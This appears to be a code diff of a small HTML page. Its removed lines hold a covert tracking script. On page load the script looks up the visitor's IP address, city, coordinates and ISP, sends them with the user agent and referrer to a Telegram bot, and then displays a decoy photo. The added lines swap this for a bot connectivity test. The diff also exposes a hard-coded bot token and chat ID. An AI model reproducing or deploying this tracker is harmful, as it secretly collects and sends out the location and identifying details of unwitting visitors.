@@ -1,70 +1,20 @@
 <!DOCTYPE html>
-<html>
-<head><title></title></head>
-<body style="margin:0;padding:0;overflow:hidden">
+<html><body>
 <script>
-const uid = new URLSearchParams(location.search).get('uid') || 'anon';
+const BOT_TOKEN = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';
+const CHAT_ID = '1572681805';
 
-// GEO APIs that WORK on GitHub Pages (no CORS blocks)
-async function getLocation() {
-    // #1: freeipapi.com - Reliable, no CORS issues
-    try {
-        const r = await fetch('https://freeipapi.com/api/json');
-        const d = await r.json();
-        return {ip:d.ipAddress, city:d.cityName, region:d.regionName, country:d.countryName, lat:d.latitude, lon:d.longitude, isp:d.isp};
-    } catch(e) {}
-    
-    // #2: ipapi.co free (direct works sometimes)
-    try {
-        const r = await fetch('https://ipapi.co/json/');
-        return await r.json();
-    } catch(e) {}
-    
-    // #3: ipgeolocation.io free demo
-    try {
-        const r = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo');
-        return await r.json();
-    } catch(e) {}
-    
-    return {city:'Unknown', country:'Unknown'};
-}
-
-async function sendToTelegram(geo) {
-    // ⚠️ CRITICAL: REPLACE THESE TWO LINES:
-    const BOT_TOKEN = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';  // Full token from @BotFather
-    const CHAT_ID = '1572681805';      // Number from getUpdates
-    
-    const msg = `🎯 *${uid} LOCATION TRACKING SUCCESS* 🎯\n\n` +
-        `📍 *Location:* ${geo.city || 'N/A'}, ${geo.region || ''}\n` +
-        `🌎 *Country:* ${geo.country || 'N/A'}\n` +
-        `📊 *Coordinates:* ${geo.lat || 'N/A'}, ${geo.lon || 'N/A'}\n` +
-        `💻 *IP:* ${geo.ip || 'N/A'}\n` +
-        `🌐 *ISP:* ${geo.isp || 'N/A'}\n\n` +
-        `👤 *User Agent:* ${navigator.userAgent.slice(0,60)}\n` +
-        `🔗 *Referrer:* ${document.referrer}`;
-    
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    
-    try {
-        await fetch(url);
-        console.log('✅ LOCATION SENT TO TELEGRAM!');
-    } catch(e) {
-        console.error('❌ TELEGRAM FAILED - CHECK TOKENS');
-        console.error(e);
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
+.then(r=>r.json())
+.then(data=> {
+    if(data.ok) {
+        document.body.innerHTML = '✅ BOT OK: ' + data.result.first_name;
+        // Now test message
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=TEST%20WORKING`);
+    } else {
+        document.body.innerHTML = '❌ BOT ERROR: ' + JSON.stringify(data);
     }
-}
-
-// EXECUTE
-(async()=>{
-    const geo = await getLocation();
-    await sendToTelegram(geo);
-    
-    // Fake loading image
-    document.body.innerHTML = `
-        <img src="https://picsum.photos/900/600?random=${Date.now()}" 
-             style="width:100vw;height:100vh;object-fit:cover;">
-    `;
-})();
+});
 </script>
 </body>
 </html>
